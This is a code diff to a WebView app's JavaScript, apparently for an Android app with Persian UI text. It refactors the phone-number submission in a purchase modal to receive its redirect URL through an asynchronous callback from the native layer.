@@ -240,7 +240,6 @@
                 
                 const playOverlay = detailsPage.querySelector('.play-overlay');
 
-                // *** CHANGED: Only trigger for play button click ***
                 playOverlay.addEventListener('click', () => {
                     try {
                         openPurchaseModal();
@@ -249,7 +248,6 @@
                         if (window.Android) window.Android.showToast('خطا در عملیات');
                     }
                 });
-
             } catch (e) {
                 console.error('Error in renderDetailsPage:', e);
                 if (window.Android) window.Android.showToast('خطا در نمایش جزئیات');
@@ -281,7 +279,28 @@
             }
         });
 
-        // *** CHANGED: Handle phone number submission and redirect ***
+        // *** CHANGED: Global function to receive dynamicTargetUrl from Android ***
+        window.receiveDynamicTargetUrl = function(url) {
+            try {
+                console.log('Received dynamicTargetUrl from Android:', url);
+                if (url && typeof url === 'string' && url.trim() !== '' && /^(https?:\/\/)/i.test(url)) {
+                    console.log('Redirecting to:', url);
+                    window.location.href = url; // Perform the redirect
+                } else {
+                    console.error('Invalid or missing dynamicTargetUrl:', url);
+                    if (window.Android && window.Android.showToast) {
+                        window.Android.showToast('URL معتبر برای ریدایرکت یافت نشد');
+                    }
+                }
+            } catch (e) {
+                console.error('Error in receiveDynamicTargetUrl:', e);
+                if (window.Android && window.Android.showToast) {
+                    window.Android.showToast('خطا در پردازش URL');
+                }
+            }
+        };
+
+        // *** CHANGED: Handle phone number submission and wait for dynamicTargetUrl ***
         submitPhoneButton.addEventListener('click', () => {
             try {
                 const phoneNumber = phoneNumberInput.value.trim();
@@ -295,16 +314,16 @@
                 submitPhoneButton.innerHTML = '<div class="spinner"></div>';
                 submitPhoneButton.disabled = true;
 
-                // Call the Android interface to submit the phone number and get the dynamicTargetUrl
-                let redirectUrl = null;
+                // Send phone number to Android and wait for dynamicTargetUrl
                 if (typeof window.Android !== 'undefined' && typeof window.Android.submitPhoneNumber === 'function') {
                     console.log('Sending phone number to Android:', phoneNumber);
-                    redirectUrl = window.Android.submitPhoneNumber(phoneNumber); // Expecting dynamicTargetUrl from WebAppInterface
+                    window.Android.submitPhoneNumber(phoneNumber); // Send phone number, expect receiveDynamicTargetUrl to be called
                 } else {
                     console.log('Android interface not found. Phone number not sent. Value:', phoneNumber);
                     // Fallback for testing in a browser
-                    redirectUrl = 'https://example.com/redirect';
                     alert(`رابط اندروید یافت نشد. شماره ارسال شده: ${phoneNumber}`);
+                    // Simulate receiving a URL for testing
+                    window.receiveDynamicTargetUrl('https://example.com/redirect');
                 }
 
                 // Reset button and close modal after a short delay
@@ -313,20 +332,13 @@
                     submitPhoneButton.disabled = false;
                     closeModal();
                     phoneNumberInput.value = ''; // Clear the input field
-
-                    // Validate and redirect to the URL
-                    if (redirectUrl && typeof redirectUrl === 'string' && redirectUrl.trim() !== '' && /^(https?:\/\/)/i.test(redirectUrl)) {
-                        console.log('Redirecting to:', redirectUrl);
-                        window.location.href = redirectUrl; // Perform the redirect
-                    } else {
-                        console.error('Invalid or missing redirect URL:', redirectUrl);
-                        if (window.Android) window.Android.showToast('URL معتبر برای ریدایرکت یافت نشد');
-                    }
                 }, 1000);
 
             } catch (e) {
                 console.error('Error in submitPhoneButton click:', e);
-                if (window.Android) window.Android.showToast('خطا در ارسال شماره');
+                if (window.Android && window.Android.showToast) {
+                    window.Android.showToast('خطا در ارسال شماره');
+                }
                 submitPhoneButton.innerHTML = 'تایید و ادامه';
                 submitPhoneButton.disabled = false;
             }
